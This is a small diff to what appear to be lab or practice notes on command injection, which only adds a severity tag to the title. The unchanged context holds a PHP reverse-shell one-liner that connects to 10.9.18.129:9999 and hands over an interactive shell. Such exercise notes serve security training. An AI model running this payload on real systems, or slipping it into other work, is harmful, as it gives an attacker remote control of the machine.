@@ -1,4 +1,4 @@
-# Command Injection Practical
+# [Severity 1] Command Injection Practical
 
 ```
 php -r '$sock=fsockopen("10.9.18.129",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
